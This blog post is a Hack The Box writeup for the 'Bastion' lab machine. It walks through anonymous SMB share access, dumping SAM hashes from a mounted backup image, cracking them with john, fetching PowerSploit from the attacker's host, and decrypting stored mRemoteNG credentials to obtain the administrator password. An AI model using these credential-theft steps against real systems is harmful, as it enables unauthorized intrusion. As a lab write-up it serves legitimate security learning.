---
layout: post
title:  "HTB - Bastion"
date:   2019-09-06 20:00 +0100
tags: writeups
---
Link: https://www.hackthebox.eu/home/machines/profile/186
IP: 10.10.10.134

<!--more-->

## Recon

```
PORT    STATE SERVICE
22/tcp  open  ssh
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

## SMB
The host has anonymous SMB with disabled message signing, so let's have a look at that.  
Let's begin with some recon:  
`msf5 > use auxiliary/scanner/smb/pipe_auditor`  
This yields some interesting endpoints: 
```
[+] 10.10.10.134:445      - Pipes: \netlogon, \lsarpc, \samr, \atsvc, \epmapper, \eventlog, \InitShutdown, \lsass, \LSM_API_service, \ntsvcs, \protected_storage, \scerpc, \srvsvc, \trkwks, \W32TIME_ALT, \wkssvc

```
`msf5 > use auxiliary/scanner/smb/smb_enumshares`
```
[-] 10.10.10.134:139      - Login Failed: Unable to Negotiate with remote host
[+] 10.10.10.134:445      - ADMIN$ - (DISK) Remote Admin
[+] 10.10.10.134:445      - Backups - (DISK) 
[+] 10.10.10.134:445      - C$ - (DISK) Default share
[+] 10.10.10.134:445      - IPC$ - (IPC) Remote IPC
```
So let's look into the shares.
First, let's mount the Backups share:  
`sudo mount -t cifs -o user=guest //10.10.10.134/Backups /mnt/`
There's a Backup of a full client machine at `WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351`.  
Could be worth a shot for NTLM hashes :3


## The Backup
So copy that VHD (in case someone resets the box while you're snooping around) and mount it with  
`sudo guestmount -a 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -i --ro /mnt/guest/`

Next up: dumping the NTHash for the user. That can be done by copying SAM and SYSTEM from `C:\Windows\system32\config\`  
and then calling pwdump on it:  
```
apalax@raudfjorden:~/writeups/HTB/Labs/Bastion$ pwdump SYSTEM SAM 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::

```
The syntax for these hashes is `username:id:LM-Hash:NT-Hash`. Let's try them by throwing these into `hashes.txt` and feeding it to john:  
```
john --format=nt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)
bureaulampje     (L4mpje)
2g 0:00:00:00 DONE (2019-09-05 19:36) 2.222g/s 10439Kp/s 10439Kc/s 10444KC/s burg772v..burdy1
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```
So it seems we have a user login / password combination.  
If we connect via SSH, we're dropped into a CMD (?).  
`user.txt` can be found at the desktop and printed with `type user.txt`.


## Road to root
Basically, I'm following this article: https://www.fuzzysecurity.com/tutorials/16.html    
We're making use of Matt Graebers excellent tool, Powersploit. 

Get PowerSploit
`wget http://10.10.15.195:8000/PowerSploit-3.0.0.zip -OutFile ps.zip`
In more detail, PowerUp. So download the Privesc folder into the PS Module path, import the module and fire away!  
```
Import-Module Privesc
Get-Command -Module Privesc
    <available commands>
Invoke-AllChecks
    <stuff stuff>
    (...)

[*] Checking %PATH% for potentially hijackable .dll locations...                                           


HijackablePath : C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps\                                      
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\L4mpje\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll' -Command '...'    
```
Not working?

Poking around shows an SSH config file with this: 
```
Match Group administrators                                                                       
       AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys 
```
unfortunately, we don't have write access to that folder as user, so keep looking!

### Ze RemoteNG?!
Poking around more reveals mRemoteNG, which seems off. Googling around reveals that it suffers from insecure password storage.  
So let's grab the connection.xml:
```
PS C:\Users\L4mpje\AppData\Roaming\mRemoteNG> type .\confCons.xml
```
We try to decrypt it with [mremoteng-decrypt](https://github.com/haseebT/mRemoteNG-Decrypt).  
This is done by providing the decrypter the administrator password hash:  
```
python mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" 
Password: thXLHM96BeKL0ER2
```

So this is root! Connect, `cd` to Desktop and `type root.txt`. Fun box, but root and Windows enum took me a while.
